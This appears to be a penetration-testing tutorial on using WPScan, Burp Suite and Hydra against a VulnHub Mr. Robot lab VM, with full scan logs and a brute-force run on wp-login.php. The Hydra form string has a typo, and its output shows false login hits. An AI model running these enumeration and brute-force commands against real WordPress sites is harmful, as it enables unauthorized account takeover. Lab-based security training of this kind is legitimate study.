# WPScan  
*WordPress Vulnerability Explotation Tool*  
Have you ever wondered how people can easily hack into WordPress sites? Want to know the secrets?  
We can utilize other tools such as _Hydra_ or _JohnTheRipper_, but WPScan has it all ready to go!  
In this tutorial, we will learn how to hack into WordPress websites using the best tool around. The one that can do it all!  
  
## Getting Started Installing WPScan;  
I will assume that you are reading this and doing the tutorial on Kali Linux that already has WPScan installed on it. However, if you do not have WPScan installed, all good. We will cover that now!  
  
This guide will walk you through how to install WPScan on Linux (Ubuntu/Debian) kernels.  
The first thing you will want to do is ensure that you have Git installed on your desktop. Like so;  
```
$ sudo apt-get install -y git  
```
After that, we will want to ensure that our Dependencies are installed and up-to-date. We can do that like this;  
```
$ sudo apt-get install libcurl14-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential  
```
Once you have those 2 accomplished, then we can get started. We will be cloning the WPScan team from the WPScan Team GitHub repo like so;  
```
$ git clone https://github.com/wpscanteam/wpscan.git  
```
Okay, so now we have our dependencies, we have git, and we cloned our WPScan program. Now what? Well, we need to finish installing the bundler.  
```
$ sudo gem install bundler && bundle install --without test  
```
This command ^^ will tell Ruby that we need to use the Bundler function in order to install and we will be bypassing the testing portion.  
Once we have all of this done, I **HIGHLY ENCOURAGE** you to keep updating WPScan. Like everyday! To do that simply navigate into the WPScan directory where we cloned it from;  
```
$ cd Downloads  
  
$ cd wpscan  
  
** To update WPScan From Repo; **  
$ git pull  
  
** To update WPScan from App; **  
$ ruby wpscan.rb --update  
  
** To Run the WPScan Command moving forward; **  
$ ruby wpscan.rb 
```
Another important factor we need to look at is getting our WPScan API Token Key. We can do that by going to this url;  
https://wpscan.com/  
And register for an account. Don't worry, it is free. However, does have limitations on the free license;  
As a researcher, you are granted 75 API Requests per day. So be careful when you try to do this among several targets throughout your journey!  
  
## Getting Started Setting up VM  
I will be making a new repo that will show us how to properly install Operating Systems on VirtualBox. If you already know how, then everything is gravy baby!  
For this tutorial, we will be using a Virtual Machine from VulnHub (Mr. Robot) that we will be able to use to attack with.  
Download the Mr. Robot Virtual Machine from [HERE](https://www.vulnhub.com/entry/mr-robot-1,151/). Once that is downloaded, double click to import this.  
Setting up the network to connect your Hackers VM to the Targets VM.  
In Virtual Box, click on Tools -> Network -> NAT Networks  
Inside of the NAT Networks, lets configure it like so;  
IPv4 Address: 10.0.0.0/24  
Name: HackingNetwork #You can name this what ever you desire#  
Check: Enable DHCP  
Alright. Now go to the Virtual Machine you have your Kali or Parrot OS on and let's configure the settings.  
*Ensure your machine is turned off for this part*  
Settings -> Network -> Attached to: |Nat Network|  
Do the same thing on our Mr. Robot VM as well.  
Now that you have those 2 on the same NAT Network, we will fire them both up. Turn on your Hacking Machine. Then Turn on your Mr. Robot machine.  
Before we go too much further, we need to discover the IP Address of our machine as well as our targets machine.  
**Find out our IP Address first;**  
*We do this so that when we scan the network, we do not confuse our IP with our Targets.*  
```
$ ifconfig  
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.4  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 fe80::a00:27ff:fe07:2994  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:07:29:94  txqueuelen 1000  (Ethernet)
        RX packets 281835  bytes 275731082 (262.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 497522  bytes 46055779 (43.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 28  bytes 1680 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28  bytes 1680 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Alright. So we can look at the "eth0" -> "inet 10.0.0.4"  
This is our IP Address.  
Now, we will fire up netdiscover and see our target's IP Address like this;  
```
$ sudo netdiscover 10.0.0.0/24  
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                             
                                                                                                                                                                                                                                           
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                           
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.0.1        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 10.0.0.2        52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                          
 10.0.0.3        08:00:27:2e:7f:83      1      60  PCS Systemtechnik GmbH                                                                                                                                                                  
 10.0.0.48       08:00:27:0f:f2:93      1      60  PCS Systemtechnik GmbH 
```
Alright. It looks like our target is going to be (10.0.0.48). We can confirm this by going to our browser and typing in;  
10.0.0.48/wp-login  
You should see a login screen powered by WordPress.  
And now we are ready to begin our course!  
  
## Getting Warmed Up  
Now that we have WPScan installed and we are ready to go, we will first discover a few basic commands about WPScan to help us progress along.  
The first thing I want to show you guys is the Help or README section of the application. Let's pull that up like so;  
```
$ wpscan --help  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

Usage: wpscan [options]
        --url URL                                 The URL of the blog to scan
                                                  Allowed Protocols: http, https
                                                  Default Protocol if none provided: http
                                                  This option is mandatory unless update or help or hh or version is/are supplied
    -h, --help                                    Display the simple help and exit
        --hh                                      Display the full help and exit
        --version                                 Display the version and exit
    -v, --verbose                                 Verbose mode
        --[no-]banner                             Whether or not to display the banner
                                                  Default: true
    -o, --output FILE                             Output to FILE
    -f, --format FORMAT                           Output results in the format supplied
                                                  Available choices: cli-no-colour, cli, cli-no-color, json
        --detection-mode MODE                     Default: mixed
                                                  Available choices: mixed, passive, aggressive
        --user-agent, --ua VALUE
        --random-user-agent, --rua                Use a random user-agent for each scan
        --http-auth login:password
    -t, --max-threads VALUE                       The max threads to use
                                                  Default: 5
        --throttle MilliSeconds                   Milliseconds to wait before doing another web request. If used, the max threads will be set to 1.
        --request-timeout SECONDS                 The request timeout in seconds
                                                  Default: 60
        --connect-timeout SECONDS                 The connection timeout in seconds
                                                  Default: 30
        --disable-tls-checks                      Disables SSL/TLS certificate verification, and downgrade to TLS1.0+ (requires cURL 7.66 for the latter)
        --proxy protocol://IP:port                Supported protocols depend on the cURL installed
        --proxy-auth login:password
        --cookie-string COOKIE                    Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
        --cookie-jar FILE-PATH                    File to read and write cookies
                                                  Default: /tmp/wpscan/cookie_jar.txt
        --force                                   Do not check if the target is running WordPress or returns a 403
        --[no-]update                             Whether or not to update the Database
        --api-token TOKEN                         The WPScan API Token to display vulnerability data, available at https://wpscan.com/profile
        --wp-content-dir DIR                      The wp-content directory if custom or not detected, such as "wp-content"
        --wp-plugins-dir DIR                      The plugins directory if custom or not detected, such as "wp-content/plugins"
    -e, --enumerate [OPTS]                        Enumeration Process
                                                  Available Choices:
                                                   vp   Vulnerable plugins
                                                   ap   All plugins
                                                   p    Popular plugins
                                                   vt   Vulnerable themes
                                                   at   All themes
                                                   t    Popular themes
                                                   tt   Timthumbs
                                                   cb   Config backups
                                                   dbe  Db exports
                                                   u    User IDs range. e.g: u1-5
                                                        Range separator to use: '-'
                                                        Value if no argument supplied: 1-10
                                                   m    Media IDs range. e.g m1-15
                                                        Note: Permalink setting must be set to "Plain" for those to be detected
                                                        Range separator to use: '-'
                                                        Value if no argument supplied: 1-100
                                                  Separator to use between the values: ','
                                                  Default: All Plugins, Config Backups
                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m
                                                  Incompatible choices (only one of each group/s can be used):
                                                   - vp, ap, p
                                                   - vt, at, t
        --exclude-content-based REGEXP_OR_STRING  Exclude all responses matching the Regexp (case insensitive) during parts of the enumeration.
                                                  Both the headers and body are checked. Regexp delimiters are not required.
        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins.
                                                  Default: passive
                                                  Available choices: mixed, passive, aggressive
        --plugins-version-detection MODE          Use the supplied mode to check plugins' versions.
                                                  Default: mixed
                                                  Available choices: mixed, passive, aggressive
        --exclude-usernames REGEXP_OR_STRING      Exclude usernames matching the Regexp/string (case insensitive). Regexp delimiters are not required.
    -P, --passwords FILE-PATH                     List of passwords to use during the password attack.
                                                  If no --username/s option supplied, user enumeration will be run.
    -U, --usernames LIST                          List of usernames to use during the password attack.
                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall
                                                  Default: 500
        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one.
                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall
        --login-uri URI                           The URI of the login page if different from /wp-login.php
        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive

[!] To see full list of options use --hh.
```
Okay, that is a lot to take in. And I agree with you 100%. And we will be using the vast majority of these commands as well, and I will help break them down a little bit more.  
Remember when I had you get your WPScan API Token key? Let's use that right quick so we don't have to worry about it from here on out.  
The reason I like to use the API Token is that it will help us identify an potential vulnerabilities on our target. These vulnerabilities can be inline with the Plugins they are using,  
the WordPress version they are using, or anything else. Let's see how we can scan our target for Vulnerabilities;  
### Scanning WordPress for Vulnerabilities;  
  
```
$ wpscan --url 10.0.0.48 --api-token YOUR_KEY_HERE --detection-mode aggressive --rua --enumerate ap  
```
Let's break this command down as it is a lot to take in!  
**wpscan** ~ this is the command/tool that we are going to be using.  
**--url 10.0.0.48** ~ Here, we are telling the program what URL we want to attack. In this case, 10.0.0.48.  
**api-token YOUR_TOKEN** ~ This is telling the program that we have a TOKEN KEY and we are using it for this scan.  
**--detection-mode aggressive** ~ The default detection mode for WPScan is mixed. However, because of what we are doing, I want it to be more aggressive to find everything.  
**--rua** ~ This allows us to run the program with Random User Agent. It helps keeps us secure & anonymous during test.  
**--enumerate ap** ~ The meat of our program scan. We will be telling the program to Enumerate All Plugins for vulnerabilities.  
And our results should look like this;  
```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.0.0.48/ [10.0.0.48]
[+] Started: Fri Dec 30 10:57:12 2022

Interesting Finding(s):

[+] robots.txt found: http://10.0.0.48/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.0.48/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.0.48/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.0.48/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.30 identified (Outdated, released on 2022-10-17).
 | Found By: Rss Generator (Aggressive Detection)
 |  - http://10.0.0.48/feed/, <generator>https://wordpress.org/?v=4.3.30</generator>
 |  - http://10.0.0.48/comments/feed/, <generator>https://wordpress.org/?v=4.3.30</generator>
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP <= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 1
 | Requests Remaining: 74

[+] Finished: Fri Dec 30 10:57:14 2022
[+] Requests Done: 32
[+] Cached Requests: 3
[+] Data Sent: 8.961 KB
[+] Data Received: 43.269 KB
[+] Memory used: 200 MB
[+] Elapsed time: 00:00:01
```

So this scan did not detect any plusing at all. Which is fine. We are just learning how to scan the site now to check for vulnerabilities. Speaking of which...  
Did you see the vulnerability that the program did find;  
```
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP <= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
```
This can tell us that the target is subjected to attacks using the SSRF by accessing the DNS Rebinding. We can do a google search like this;  
Google.com -> Unauthenticated Blind SSRF via DNS Rebinding -> https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11?__cf_chl_tk=5XIsXXaxDorUDA4v1tGEGs1zaaz3PY4dY..NSDr4tqA-1672416206-0-gaNycGzNBxE  
Okay. That works. But we will keep going.  
  
Now, let's run the same command again, except this time, I want to check the Themes involved on our target. We can do that by replacing the "--enumerate ap" with "--enumerate at". And we can get;  
```
$ wpscan --url 10.0.0.48 --api-token YOUR_KEY_HERE --detection-mode aggressive --rua --enumerate at  

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.0.0.48/ [10.0.0.48]
[+] Started: Fri Dec 30 11:05:41 2022

Interesting Finding(s):

[+] robots.txt found: http://10.0.0.48/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.0.48/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.0.48/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.0.48/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.30 identified (Outdated, released on 2022-10-17).
 | Found By: Rss Generator (Aggressive Detection)
 |  - http://10.0.0.48/feed/, <generator>https://wordpress.org/?v=4.3.30</generator>
 |  - http://10.0.0.48/comments/feed/, <generator>https://wordpress.org/?v=4.3.30</generator>
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP <= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/

[i] The main theme could not be detected.

[+] Enumerating All Themes (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:00 <========================================================================================================================================================> (25076 / 25076) 100.00% Time: 00:01:00
[+] Checking Theme Versions (via Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://10.0.0.48/wp-content/themes/twentyfifteen/
 | Latest Version: 3.3
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.0.0.48/wp-content/themes/twentyfifteen/readme.txt
 | Style URL: http://10.0.0.48/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.0.0.48/wp-content/themes/twentyfifteen/, status: 500
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Twenty Fifteen Theme <= 1.1 - DOM Cross-Site Scripting (XSS)
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/2499b30a-4bcc-462a-935e-1fe4664b95d5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3429
 |      - https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
 |      - https://packetstormsecurity.com/files/131802/
 |      - https://seclists.org/fulldisclosure/2015/May/41
 |
 | The version could not be determined.

[+] twentyfourteen
 | Location: http://10.0.0.48/wp-content/themes/twentyfourteen/
 | Latest Version: 3.5
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.0.0.48/wp-content/themes/twentyfourteen/readme.txt
 | Style URL: http://10.0.0.48/wp-content/themes/twentyfourteen/style.css
 | Style Name: Twenty Fourteen
 | Style URI: https://wordpress.org/themes/twentyfourteen/
 | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.0.0.48/wp-content/themes/twentyfourteen/, status: 500
 |
 | The version could not be determined.

[+] twentythirteen
 | Location: http://10.0.0.48/wp-content/themes/twentythirteen/
 | Latest Version: 3.7
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.0.0.48/wp-content/themes/twentythirteen/readme.txt
 | Style URL: http://10.0.0.48/wp-content/themes/twentythirteen/style.css
 | Style Name: Twenty Thirteen
 | Style URI: https://wordpress.org/themes/twentythirteen/
 | Description: The 2013 theme for WordPress takes us back to the blog, featuring a full range of post formats, each...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.0.0.48/wp-content/themes/twentythirteen/, status: 500
 |
 | The version could not be determined.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 71

[+] Finished: Fri Dec 30 11:06:46 2022
[+] Requests Done: 25123
[+] Cached Requests: 7
[+] Data Sent: 7.569 MB
[+] Data Received: 8.068 MB
[+] Memory used: 204.168 MB
[+] Elapsed time: 00:01:04
```
  

The first thing we can see, is that this scan also detected the same vulnerability. Which is good, that means the first scan is not a False Positive. However, we are looking at finding a vulnerability inside the theme itself.  
And while the main theme itself is not identified, we can clearly see that the theme title "Twenty Fifteen Theme" is vulnerable;  
```
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Twenty Fifteen Theme <= 1.1 - DOM Cross-Site Scripting (XSS)
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/2499b30a-4bcc-462a-935e-1fe4664b95d5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3429
 |      - https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
 |      - https://packetstormsecurity.com/files/131802/
 |      - https://seclists.org/fulldisclosure/2015/May/41
 |
 | The version could not be determined.
```
What is amazing about this tool, if you look at the "References" section, it already tells us where we can view the vulnerability at. So we don't have to do a Google search!  
  

### Scanning WordPress for Usernames;  
What good would this application be if we did not learn how we can scan the website to get a list of usernames that we can use? Inside of this repo, I have included a .txt file called usernames.txt.  
**Using WPScan to Find Usernames**  
Being able to find and enumerate usernames is one of the easist tasks here. Especially if the target is well established and has several articles on it. Let's see how we can use WPScan to find usernames;  
```
$ wpscan --url 10.0.0.48 --rua --enumerate u  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.0.0.48/ [10.0.0.48]
[+] Started: Fri Dec 30 11:36:25 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.0.0.48/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.0.0.48/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.0.0.48/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.0.0.48/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.30 identified (Outdated, released on 0001-01-01).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.0.0.48/cb15191.html, Match: '-release.min.js?ver=4.3.30'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.0.0.48/cb15191.html, Match: 'WordPress 4.3.30'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.0.0.48/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.0.0.48/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://10.0.0.48/wp-content/themes/twentyfifteen/style.css?ver=4.3.30
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.0.0.48/wp-content/themes/twentyfifteen/style.css?ver=4.3.30, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Dec 30 11:36:27 2022
[+] Requests Done: 41
[+] Cached Requests: 24
[+] Data Sent: 10.298 KB
[+] Data Received: 230.479 KB
[+] Memory used: 161.922 MB
[+] Elapsed time: 00:00:01
```
BUMMER! We did not find any usernames. What do we do now? Give up? **WE ARE HACKERS!** We will find a way.  

This did not work. But we have more options! We will be using that in order to scan our target in order to generate any potential usernames we can find on our target. Let's discover how we can do that now. However, we will be taking advantage of 
2 other programs to give us a hand here. The first one will be Burp Suite. This will help us intercept the traffic data and give us the string we need to run Hydra.  
**Setting Up & Configure BurpSuite**  
The first tool we will be looking at is BurpSuite.
When you first open Burp, just click on the next button until you get to the dashboard of the program!

    Open BurpSuite
    Click on Proxy
    Select "Options"
    Click "Running" on Interface
    Now, open your Firefox browser and select "Preferences" -> "Advanced" -> "Network" -> Settings"
    Select "Manual Proxy Configuration"
    Copy Proxy IP from Burp to here
    Copy Port from Burp to here

Now all you do is enable intercept and navigate to the wp-login page. Or if you are there already, just refresh the page!
Now we are able to intercept the information between the target website and our computer.

Once we have all that setup, let's look at something. Let's select the "Send to Intruder" and then open the Intruder tab. What I want you to do is put in a random username & password in the login page and then click "Log In".

Once you do that, go to Burp and find this string;
log=admin&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.0.48%2Fwp-admin%2F&testcookie=1

This will come in handy in just a second.
Now, we can right click and select "Send to Repeater". This will allos us to change the username & password in the Burp and then send it back to the website to see what we can get.

But right now, we are going to use a special tool called Hydra that will allow us to bruteforce the targets username!
  
**Using Hydra to Bruteforce Usernames**  
```
$ hydra -V -L usernames.txt -p test 10.0.0.48 http-post-form '/wp-login.php:og=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'  
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-30 11:32:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.0.0.48:80/wp-login.php:og=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[ATTEMPT] target 10.0.0.48 - login "true" - pass "test" - 1 of 858235 [child 0] (0/0)
[ATTEMPT] target 10.0.0.48 - login "false" - pass "test" - 2 of 858235 [child 1] (0/0)
[ATTEMPT] target 10.0.0.48 - login "wikia" - pass "test" - 3 of 858235 [child 2] (0/0)
[ATTEMPT] target 10.0.0.48 - login "from" - pass "test" - 4 of 858235 [child 3] (0/0)
[ATTEMPT] target 10.0.0.48 - login "the" - pass "test" - 5 of 858235 [child 4] (0/0)
[ATTEMPT] target 10.0.0.48 - login "now" - pass "test" - 6 of 858235 [child 5] (0/0)
[ATTEMPT] target 10.0.0.48 - login "Wikia" - pass "test" - 7 of 858235 [child 6] (0/0)
[ATTEMPT] target 10.0.0.48 - login "extensions" - pass "test" - 8 of 858235 [child 7] (0/0)
[ATTEMPT] target 10.0.0.48 - login "scss" - pass "test" - 9 of 858235 [child 8] (0/0)
[ATTEMPT] target 10.0.0.48 - login "window" - pass "test" - 10 of 858235 [child 9] (0/0)
[ATTEMPT] target 10.0.0.48 - login "http" - pass "test" - 11 of 858235 [child 10] (0/0)
[ATTEMPT] target 10.0.0.48 - login "var" - pass "test" - 12 of 858235 [child 11] (0/0)
[ATTEMPT] target 10.0.0.48 - login "page" - pass "test" - 13 of 858235 [child 12] (0/0)
[ATTEMPT] target 10.0.0.48 - login "Robot" - pass "test" - 14 of 858235 [child 13] (0/0)
[ATTEMPT] target 10.0.0.48 - login "Elliot" - pass "test" - 15 of 858235 [child 14] (0/0)
[ATTEMPT] target 10.0.0.48 - login "styles" - pass "test" - 16 of 858235 [child 15] (0/0)
[80][http-post-form] host: 10.0.0.48   login: true   password: test
[ATTEMPT] target 10.0.0.48 - login "and" - pass "test" - 17 of 858235 [child 0] (0/0)
[80][http-post-form] host: 10.0.0.48   login: false   password: test
[80][http-post-form] host: 10.0.0.48   login: scss   password: test
[80][http-post-form] host: 10.0.0.48   login: page   password: test
[ATTEMPT] target 10.0.0.48 - login "document" - pass "test" - 18 of 858235 [child 1] (0/0)
[80][http-post-form] host: 10.0.0.48   login: from   password: test
[ATTEMPT] target 10.0.0.48 - login "mrrobot" - pass "test" - 19 of 858235 [child 8] (0/0)
[ATTEMPT] target 10.0.0.48 - login "com" - pass "test" - 20 of 858235 [child 12] (0/0)
[80][http-post-form] host: 10.0.0.48   login: styles   password: test
[80][http-post-form] host: 10.0.0.48   login: wikia   password: test
[ATTEMPT] target 10.0.0.48 - login "ago" - pass "test" - 21 of 858235 [child 3] (0/0)
